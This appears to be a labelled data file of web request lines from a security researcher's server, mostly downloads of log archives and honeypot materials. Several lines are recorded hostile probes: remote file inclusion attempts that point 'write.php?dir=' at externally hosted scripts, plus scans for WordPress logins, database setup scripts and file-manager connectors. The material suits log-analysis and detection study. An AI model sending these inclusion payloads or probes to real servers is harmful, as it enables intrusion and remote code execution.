47,1,200,0,GET /self.logs/error.log.2016-01-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-23.gz HTTP/1.1
106,1,404,0,GET //write.php?dir=http://www.ostinato.be//components/com_avreloaded/views/popup/tmpl/rfix.txt?? HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-13.gz HTTP/1.1
32,1,200,0,GET /self.logs/?C=M;O=A HTTP/1.1
41,1,404,0,GET /apple-touch-icon152x152.png HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-03.gz HTTP/1.1
58,1,404,1,GET /honeypot//%22https://twitter.com/sooshie/%22 HTTP/1.0
58,1,404,1,GET /honeypot//%22https://twitter.com/sooshie/%22 HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-09.gz HTTP/1.1
45,1,404,0,GET /_file-manager/php/connector.php HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-22.gz HTTP/1.1
119,1,404,1,GET /honeypot//write.php?dir=http://www.kennyagrisoft.com//wp-content/themes/DynamiX/lib/scripts/sikat.txt???? HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-03.gz HTTP/1.1
32,1,404,0,GET /js/mage/cookies.js HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-03.gz HTTP/1.1
45,1,404,1,GET /honeypot/BSidesDFW - 2014.ipynb HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2016-07-23.gz HTTP/1.1
20,1,206,0,GET /#about HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-09.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-01-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-22.gz HTTP/1.1
37,1,404,0,GET //write.php?dir=remote?? HTTP/1.1
22,1,206,0,GET /#network HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-20.gz HTTP/1.1
36,1,206,0,GET /maccdc2012/conn.log.gz HTTP/1.1
36,1,200,0,GET /maccdc2012/conn.log.gz HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2015-05-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-25.gz HTTP/1.1
36,1,404,0,GET /member/images/base.css HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-06.gz HTTP/1.1
22,1,200,0,GET /tg/c.zip HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-23.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-01-31.gz HTTP/1.1
33,1,404,0,GET /nzgpgyorihylzz.html HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-10.gz HTTP/1.1
24,1,200,0,GET /self.logs/ HTTP/1.1
24,1,200,0,GET /self.logs/ HTTP/1.0
48,1,404,0,GET /self.logs/access.log.2015-01-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-05.gz HTTP/1.1
27,1,301,0,HEAD /wp-login.php HTTP/1.1
42,1,404,0,GET /apple-touch-icon-120x120.png HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-31.gz HTTP/1.1
24,1,404,0,GET /update.php HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2015-02-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-18.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-01-05.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-11.gz HTTP/1.1
69,1,200,1,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1
69,1,200,1,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2015-04-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-13.gz HTTP/1.1
33,1,200,0,GET /maccdc2012/?C=M;O=A HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-24.gz HTTP/1.1
40,1,301,0,GET //bootstrap/img/favicon.ico HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-28.gz HTTP/1.1
32,1,404,0,GET /data/admin/ver.txt HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-26.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-27.gz HTTP/1.1
37,1,200,0,GET /maccdc2012/files.log.gz HTTP/1.1
37,1,200,0,GET /maccdc2012/files.log.gz HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2015-09-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-18.gz HTTP/1.1
49,1,404,1,GET /honeypot/bsidesdfw%20-%202014.ipynb HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-04.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-01-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-17.gz HTTP/1.1
28,1,301,0,GET /test/wp-admin/ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-24.gz HTTP/1.1
60,3,404,0,GET /index.php?app=core&module=global&section=login HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-06.gz HTTP/1.1
36,1,200,0,GET /maccdc2012/http.log.gz HTTP/1.1
36,1,200,0,GET /maccdc2012/http.log.gz HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2015-07-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-08.gz HTTP/1.1
207,4,404,1,GET /honeypot/Honeypot%2520-%2520Howto%2520-%2520BSides%2520Austin.pdf&amp;sa=U&amp;ved=0ahUKEwjT-NXh6IXRAhXVdFAKHWhpC1E4URAWCCwwBQ&amp;usg=AFQjCNECd9WKWE5QQr2RPFKoA-ce5IW95w//write.php?dir=remote?? HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-31.gz HTTP/1.1
49,1,200,1,GET /honeypot/scrubbed_honeypot.json.zip HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-28.gz HTTP/1.1
18,1,404,0,GET /data HTTP/1.1
18,1,404,0,GET /data HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2016-04-18.gz HTTP/1.1
32,1,404,0,HEAD /sitemap_index.xml HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-22.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-21.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2015-02-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-29.gz HTTP/1.1
44,1,404,1,GET /honeypot//write.php?dir=test?? HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-15.gz HTTP/1.1
47,1,404,1,GET /honeypot/honeypot%20-%20howto.pdf HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-27.gz HTTP/1.1
48,1,404,1,GET /honeypot/dbadmin/scripts/setup.php HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-26.gz HTTP/1.1
38,1,200,0,GET /pe_static/op-cleaver.zip HTTP/1.1
29,1,404,0,GET /admin/login.php HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-02.gz HTTP/1.1
28,1,404,0,HEAD //wp-login.php HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-25.gz HTTP/1.1
41,1,404,0,GET /google30776e34d2e57a82.html HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-20.gz HTTP/1.1
79,1,404,1,GET /honeypot/Honeypot%2520-%2520Howto%2520-%2520BSides%2520Austin.pdf HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2015-11-27.gz HTTP/1.1
25,1,404,0,GET /license.php HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2015-05-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-26.gz HTTP/1.1
15,1,404,0,GET /g HTTP/1.1
33,1,301,0,POST /js/mage/cookies.js HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-06.gz HTTP/1.1
110,1,404,0,GET //write.php?dir=http://www.kennyagrisoft.com//wp-content/themes/DynamiX/lib/scripts/sikat.txt???? HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-02.gz HTTP/1.1
45,1,404,1,GET /mysql/scripts/db_setup.init.php HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-24.gz HTTP/1.1
17,1,404,0,GET /wp/ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-21.gz HTTP/1.1
29,1,404,0,GET /blog/robots.txt HTTP/1.1
37,1,404,0,GET /data/admin/allowurl.txt HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-31.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-15.gz HTTP/1.1
